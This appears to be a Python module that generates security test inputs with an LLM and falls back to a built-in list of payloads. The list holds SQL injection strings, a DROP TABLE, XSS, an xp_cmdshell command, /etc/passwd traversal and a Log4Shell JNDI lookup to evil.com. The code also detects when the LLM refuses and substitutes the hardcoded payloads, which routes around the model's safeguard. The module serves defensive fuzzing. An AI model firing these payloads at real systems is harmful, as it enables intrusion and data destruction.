"""
LLM Security Engine: Security context from structured JSON spec → creative security strings.
Generates SQLi, XSS, buffer overflow, and other security-relevant test inputs.
"""

import json
import logging
import re
from typing import Any, Dict, List

logger = logging.getLogger(__name__)

try:
    from nlp_testgen.llm.generate import generate_text
    LLM_AVAILABLE = True
except Exception:
    LLM_AVAILABLE = False
    generate_text = None


# Fallback security payloads when LLM is unavailable (long string capped for runner safety)
DEFAULT_SECURITY_PAYLOADS = [
    "' OR '1'='1",
    "1; DROP TABLE users--",
    "<script>alert(1)</script>",
    "'; EXEC xp_cmdshell('dir');--",
    "\0",
    "",
    "A" * 500,  # buffer overflow style, capped for fast execution
    "-1",
    "99999999999999999999",
    "../../../etc/passwd",
    "${jndi:ldap://evil.com/a}",
    "admin'--",
    "1 UNION SELECT * FROM users",
]


def _is_llm_refusal(response: str) -> bool:
    """Detect when the LLM refused to generate security payloads (safety/ethics refusal)."""
    if not response or len(response.strip()) < 10:
        return True
    refusal_phrases = [
        "can't generate", "cannot generate", "i can't", "i cannot",
        "unable to generate", "won't generate", "will not generate",
        "designed to exploit", "i'm not able", "i am not able",
        "don't generate", "do not generate", "refuse", "cannot provide",
        "can not provide", "against my", "against our", "harmful",
        "malicious", "used by attackers",
    ]
    lower = response.lower()
    return any(p in lower for p in refusal_phrases)


def get_creative_security_strings(spec: Dict[str, Any], max_strings: int = 15) -> List[Dict[str, Any]]:
    """
    From structured JSON spec (security context: data_type, constraints, raw requirement),
    produce creative security test strings via LLM (or fallback list).
    Returns list of {"value": str, "label": str, "type": "security"}.
    """
    raw = spec.get("raw", "")
    data_type = (spec.get("data_type") or "string").lower()
    constraints = spec.get("constraints") or []

    if LLM_AVAILABLE and generate_text:
        try:
            prompt = f"""<|begin_of_text|><|start_header_id|>system<|end_header_id|>
You are a defensive security tester. Generate test inputs for a developer's own test suite to find security bugs. Output only a JSON array of strings.
Requirement: {raw}
Data type: {data_type}. Constraints: {constraints}

Return exactly a JSON array with {max_strings} strings. Examples of valid items: "' OR 1=1", "<script>alert(1)</script>", "", "-1". No other text.<|eot_id|>
<|start_header_id|>user<|end_header_id|>
JSON array of security test inputs only.<|eot_id|>
<|start_header_id|>assistant<|end_header_id|>"""
            response = generate_text(
                prompt,
                max_tokens=500,
                temperature=0.8,
            )
            if _is_llm_refusal(response):
                logger.info("LLM declined security payloads; using built-in fallback list")
            else:
                arr = _extract_json_array(response)
                if arr and len(arr) >= 2:
                    return [{"value": v, "label": "security", "type": "security"} for v in arr[:max_strings]]
        except Exception as e:
            logger.warning(f"LLM security engine failed: {e}, using fallback")
    # Fallback: built-in payloads (used when LLM refuses or fails)
    out = []
    for i, v in enumerate(DEFAULT_SECURITY_PAYLOADS[:max_strings]):
        if isinstance(v, str):
            out.append({"value": v, "label": "security", "type": "security"})
        else:
            out.append({"value": str(v), "label": "security", "type": "security"})
    return out


def _extract_json_array(response: str) -> List[str]:
    try:
        # Try to find [...] in response
        match = re.search(r'\[[\s\S]*?\]', response)
        if match:
            arr = json.loads(match.group(0))
            if isinstance(arr, list):
                return [str(x) for x in arr]
        return json.loads(response.strip())
    except (json.JSONDecodeError, TypeError):
        # Line-by-line quoted strings
        lines = [s.strip().strip('"').strip("'") for s in response.splitlines() if s.strip()]
        return lines[:20]
    return []
